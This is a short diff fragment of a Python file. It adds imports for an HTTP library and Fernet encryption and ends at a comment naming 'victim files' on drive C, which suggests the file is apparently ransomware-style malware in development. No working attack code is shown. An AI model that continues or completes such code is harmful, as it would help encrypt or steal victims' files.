@@ -1,6 +1,6 @@
 import os
-
-
+import requests
+from cryptography.fernet import Fernet
 from datetime import datetime
 
 # Victim files path on Drive C
